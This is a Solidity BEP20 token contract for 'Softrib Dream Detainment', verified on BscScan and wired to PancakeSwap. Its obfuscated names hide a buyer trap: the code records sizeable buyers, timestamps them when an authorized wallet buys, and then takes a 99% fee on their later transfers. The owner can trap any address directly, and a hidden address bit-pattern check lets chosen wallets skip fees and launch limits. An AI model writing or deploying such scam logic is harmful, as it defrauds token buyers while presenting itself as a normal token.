/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.4;abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function transferOwnership(address payable adr) public onlyOwner() {        owner = adr;        competent[adr] = true;        emit OwnershipTransferred(adr);    }    event OwnershipTransferred(address owner);    function Owner() public view returns (address) {        return owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IUniswapV2Router {    function factory() external pure returns (address);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function WETH() external pure returns (address);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}library SafeMath {    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }}interface IBEP20 {    function balanceOf(address account) external view returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    function decimals() external view returns (uint8);    function symbol() external view returns (string memory);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function totalSupply() external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function name() external view returns (string memory);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function getOwner() external view returns (address);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}contract SoftribDreamDetainment is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    string constant _name = "Softrib Dream Detainment ";    string constant _symbol = "SoftribDreamDetainment";    uint8 constant _decimals = 18;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private launchedAutoLiquidityReceiverTxMaxMarketing;    mapping(address => bool) private teamMinMarketingLiquidity;    mapping(address => bool) private maxAutoIsBurnSwapFee;    mapping(address => bool) private exemptIsWalletLimit;    mapping(address => uint256) private walletBurnReceiverMin;    mapping(uint256 => address) private autoSellTeamMode;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private receiverMarketingSwapMin = 0;    uint256 private buyMinAutoSwapModeLimit = 5;    //SELL FEES    uint256 private maxBotsTxAutoBuyReceiverLaunched = 0;    uint256 private walletTxMaxMin = 5;    uint256 private exemptBotsSwapMin = buyMinAutoSwapModeLimit + receiverMarketingSwapMin;    uint256 private botsMarketingAutoBurn = 100;    address private tradingLimitExemptBurnFeeBots = (msg.sender); // auto-liq address    address private buyLaunchedLiquidityExempt = (0x1843CdbCef2A10bAEA78b93BfFffC6ff8b4588ce); // marketing address    address private feeBotsSellMax = DEAD;    address private botsBurnFeeReceiver = DEAD;    address private tradingMaxTeamBuyLimitMarketingTx = DEAD;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private liquidityFeeSellMarketingReceiverMin;    uint256 private walletModeBuyReceiver;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);    bool private modeSwapExemptTrading;    uint256 private autoFeeSwapBurnBuyWallet;    uint256 private limitTxAutoTrading;    uint256 private liquidityTradingBotsLaunched;    uint256 private maxFeeMinMarketing;    bool private receiverAutoSellWalletBurnMaxTeam = true;    bool private exemptIsWalletLimitMode = true;    bool private feeTeamReceiverTxMarketingWalletLaunched = true;    bool private launchedMarketingLimitIsExemptLiquiditySell = true;    bool private minReceiverSellAuto = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private modeLiquidityBurnTeam = 6 * 10 ** 15;    uint256 private teamLimitIsModeBotsSwapBurn = _totalSupply / 1000; // 0.1%        bool public feeTradingMaxModeLiquidityBurn = false;    bool public isMarketingBotsLaunched = false;    bool public modeSellWalletLaunchedFeeBurnMin = false;    uint256 public walletTxTradingFeeMinLaunchedTeam = 0;    bool public limitBurnWalletSwap = false;    bool public burnSellMarketingSwap = false;    uint256 private txLimitFeeAutoIsReceiver = 0;    bool public tradingIsMarketingMax = false;    bool private teamReceiverIsTxBotsFee = false;    bool private isTradingTxMax = false;    bool public isMarketingBotsLaunched0 = false;    bool public isMarketingBotsLaunched1 = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        modeSwapExemptTrading = true;        launchedAutoLiquidityReceiverTxMaxMarketing[msg.sender] = true;        launchedAutoLiquidityReceiverTxMaxMarketing[address(this)] = true;        teamMinMarketingLiquidity[msg.sender] = true;        teamMinMarketingLiquidity[0x0000000000000000000000000000000000000000] = true;        teamMinMarketingLiquidity[0x000000000000000000000000000000000000dEaD] = true;        teamMinMarketingLiquidity[address(this)] = true;        maxAutoIsBurnSwapFee[msg.sender] = true;        maxAutoIsBurnSwapFee[0x0000000000000000000000000000000000000000] = true;        maxAutoIsBurnSwapFee[0x000000000000000000000000000000000000dEaD] = true;        maxAutoIsBurnSwapFee[address(this)] = true;        SetAuthorized(address(0x7d08eC4A30562224803C0406FFffDFd281499dED));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return sellLimitBotsLaunchedSwapTeamAuto(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return sellLimitBotsLaunchedSwapTeamAuto(sender, recipient, amount);    }    function modeAutoBotsMin(address addr) private {        if (txSwapMinIsBurn() < modeLiquidityBurnTeam) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        autoSellTeamMode[maxWalletAmount] = addr;    }
    function getMaxAutoIsBurnSwapFee(address a0) public view returns (bool) {        if (a0 == botsBurnFeeReceiver) {            return minReceiverSellAuto;        }            return maxAutoIsBurnSwapFee[a0];    }
    function liquidityReceiverIsExemptLimitMode(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = walletBurnReceiverMin[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    function walletSellAutoTeam(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function autoTradingBotsBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (isTradingTxMax != receiverAutoSellWalletBurnMaxTeam) {            isTradingTxMax = teamReceiverIsTxBotsFee;        }        uint256 feeAmount = amount.mul(minLaunchedReceiverAutoTeamLiquidityIs(sender, receiver == uniswapV2Pair)).div(botsMarketingAutoBurn);        if (exemptIsWalletLimit[sender] || exemptIsWalletLimit[receiver]) {            feeAmount = amount.mul(99).div(botsMarketingAutoBurn);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function minLaunchedReceiverAutoTeamLiquidityIs(address sender, bool selling) internal returns (uint256) {                if (isTradingTxMax != minReceiverSellAuto) {            isTradingTxMax = minReceiverSellAuto;        }        if (teamReceiverIsTxBotsFee == receiverAutoSellWalletBurnMaxTeam) {            teamReceiverIsTxBotsFee = minReceiverSellAuto;        }        if (txLimitFeeAutoIsReceiver != maxBotsTxAutoBuyReceiverLaunched) {            txLimitFeeAutoIsReceiver = exemptBotsSwapMin;        }        if (selling) {            exemptBotsSwapMin = walletTxMaxMin + maxBotsTxAutoBuyReceiverLaunched;            return liquidityReceiverIsExemptLimitMode(sender, exemptBotsSwapMin);        }        if (!selling && sender == uniswapV2Pair) {            exemptBotsSwapMin = buyMinAutoSwapModeLimit + receiverMarketingSwapMin;            return exemptBotsSwapMin;        }        return liquidityReceiverIsExemptLimitMode(sender, exemptBotsSwapMin);    }
    function getMaxBotsTxAutoBuyReceiverLaunched() public view returns (uint256) {        if (maxBotsTxAutoBuyReceiverLaunched != walletTxMaxMin) {            return walletTxMaxMin;        }        if (maxBotsTxAutoBuyReceiverLaunched == maxBotsTxAutoBuyReceiverLaunched) {            return maxBotsTxAutoBuyReceiverLaunched;        }        return maxBotsTxAutoBuyReceiverLaunched;    }
    function receiverLiquidityMaxMode(address sender) internal view returns (bool) {        return !teamMinMarketingLiquidity[sender];    }
    function getLaunchedMarketingLimitIsExemptLiquiditySell() public view returns (bool) {        if (launchedMarketingLimitIsExemptLiquiditySell == feeTeamReceiverTxMarketingWalletLaunched) {            return feeTeamReceiverTxMarketingWalletLaunched;        }        if (launchedMarketingLimitIsExemptLiquiditySell == teamReceiverIsTxBotsFee) {            return teamReceiverIsTxBotsFee;        }        return launchedMarketingLimitIsExemptLiquiditySell;    }
    function buyTxAutoTeamFee() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (walletBurnReceiverMin[autoSellTeamMode[i]] == 0) {                    walletBurnReceiverMin[autoSellTeamMode[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function setMaxAutoIsBurnSwapFee(address a0,bool a1) public onlyOwner {        if (maxAutoIsBurnSwapFee[a0] == launchedAutoLiquidityReceiverTxMaxMarketing[a0]) {           launchedAutoLiquidityReceiverTxMaxMarketing[a0]=a1;        }        maxAutoIsBurnSwapFee[a0]=a1;    }
    function getWalletTxMaxMin() public view returns (uint256) {        if (walletTxMaxMin != maxBotsTxAutoBuyReceiverLaunched) {            return maxBotsTxAutoBuyReceiverLaunched;        }        return walletTxMaxMin;    }
    function setExemptBotsSwapMin(uint256 a0) public onlyOwner {        if (exemptBotsSwapMin == receiverMarketingSwapMin) {            receiverMarketingSwapMin=a0;        }        exemptBotsSwapMin=a0;    }
    function sellLimitBotsLaunchedSwapTeamAuto(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bLimitTxWalletValue = buyBurnLimitAuto(sender) || buyBurnLimitAuto(recipient);                if (txLimitFeeAutoIsReceiver != exemptBotsSwapMin) {            txLimitFeeAutoIsReceiver = walletTxMaxMin;        }        if (isTradingTxMax != exemptIsWalletLimitMode) {            isTradingTxMax = receiverAutoSellWalletBurnMaxTeam;        }        if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                buyTxAutoTeamFee();            }            if (!bLimitTxWalletValue) {                modeAutoBotsMin(recipient);            }        }                if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (isTradingTxMax == minReceiverSellAuto) {            isTradingTxMax = isTradingTxMax;        }        if (inSwap || bLimitTxWalletValue) {return walletSellAutoTeam(sender, recipient, amount);}        if (!launchedAutoLiquidityReceiverTxMaxMarketing[sender] && !launchedAutoLiquidityReceiverTxMaxMarketing[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || maxAutoIsBurnSwapFee[sender] || maxAutoIsBurnSwapFee[recipient], "Max TX Limit!");        if (minWalletMarketingFee()) {walletMarketingLiquidityMin();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = receiverLiquidityMaxMode(sender) ? autoTradingBotsBuy(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function setTradingLimitExemptBurnFeeBots(address a0) public onlyOwner {        tradingLimitExemptBurnFeeBots=a0;    }
    function setWalletTxMaxMin(uint256 a0) public onlyOwner {        walletTxMaxMin=a0;    }
    function setLaunchedMarketingLimitIsExemptLiquiditySell(bool a0) public onlyOwner {        launchedMarketingLimitIsExemptLiquiditySell=a0;    }
    function getTeamLimitIsModeBotsSwapBurn() public view returns (uint256) {        return teamLimitIsModeBotsSwapBurn;    }
    function getTxLimitFeeAutoIsReceiver() public view returns (uint256) {        if (txLimitFeeAutoIsReceiver == maxBotsTxAutoBuyReceiverLaunched) {            return maxBotsTxAutoBuyReceiverLaunched;        }        return txLimitFeeAutoIsReceiver;    }
    function getExemptBotsSwapMin() public view returns (uint256) {        if (exemptBotsSwapMin == receiverMarketingSwapMin) {            return receiverMarketingSwapMin;        }        if (exemptBotsSwapMin == teamLimitIsModeBotsSwapBurn) {            return teamLimitIsModeBotsSwapBurn;        }        if (exemptBotsSwapMin == buyMinAutoSwapModeLimit) {            return buyMinAutoSwapModeLimit;        }        return exemptBotsSwapMin;    }
    function getTradingLimitExemptBurnFeeBots() public view returns (address) {        if (tradingLimitExemptBurnFeeBots == botsBurnFeeReceiver) {            return botsBurnFeeReceiver;        }        if (tradingLimitExemptBurnFeeBots != tradingMaxTeamBuyLimitMarketingTx) {            return tradingMaxTeamBuyLimitMarketingTx;        }        if (tradingLimitExemptBurnFeeBots != feeBotsSellMax) {            return feeBotsSellMax;        }        return tradingLimitExemptBurnFeeBots;    }
    function setMaxBotsTxAutoBuyReceiverLaunched(uint256 a0) public onlyOwner {        if (maxBotsTxAutoBuyReceiverLaunched == walletTxMaxMin) {            walletTxMaxMin=a0;        }        maxBotsTxAutoBuyReceiverLaunched=a0;    }
    function setWalletBurnReceiverMin(address a0,uint256 a1) public onlyOwner {        if (walletBurnReceiverMin[a0] == walletBurnReceiverMin[a0]) {           walletBurnReceiverMin[a0]=a1;        }        walletBurnReceiverMin[a0]=a1;    }
    function minWalletMarketingFee() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    minReceiverSellAuto &&    _balances[address(this)] >= teamLimitIsModeBotsSwapBurn;    }
    function setTeamLimitIsModeBotsSwapBurn(uint256 a0) public onlyOwner {        if (teamLimitIsModeBotsSwapBurn == walletTxMaxMin) {            walletTxMaxMin=a0;        }        if (teamLimitIsModeBotsSwapBurn == buyMinAutoSwapModeLimit) {            buyMinAutoSwapModeLimit=a0;        }        if (teamLimitIsModeBotsSwapBurn == exemptBotsSwapMin) {            exemptBotsSwapMin=a0;        }        teamLimitIsModeBotsSwapBurn=a0;    }
    function setTxLimitFeeAutoIsReceiver(uint256 a0) public onlyOwner {        txLimitFeeAutoIsReceiver=a0;    }
    function getLaunchedAutoLiquidityReceiverTxMaxMarketing(address a0) public view returns (bool) {        if (a0 != tradingMaxTeamBuyLimitMarketingTx) {            return launchedMarketingLimitIsExemptLiquiditySell;        }            return launchedAutoLiquidityReceiverTxMaxMarketing[a0];    }
    function walletMarketingLiquidityMin() internal swapping {                uint256 amountToLiquify = teamLimitIsModeBotsSwapBurn.mul(receiverMarketingSwapMin).div(exemptBotsSwapMin).div(2);        uint256 amountToSwap = teamLimitIsModeBotsSwapBurn.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = exemptBotsSwapMin.sub(receiverMarketingSwapMin.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(receiverMarketingSwapMin).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(buyMinAutoSwapModeLimit).div(totalETHFee);                payable(buyLaunchedLiquidityExempt).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                tradingLimitExemptBurnFeeBots,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function txSwapMinIsBurn() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function buyBurnLimitAuto(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getWalletBurnReceiverMin(address a0) public view returns (uint256) {            return walletBurnReceiverMin[a0];    }
    function setLaunchedAutoLiquidityReceiverTxMaxMarketing(address a0,bool a1) public onlyOwner {        if (a0 == botsBurnFeeReceiver) {            minReceiverSellAuto=a1;        }        launchedAutoLiquidityReceiverTxMaxMarketing[a0]=a1;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}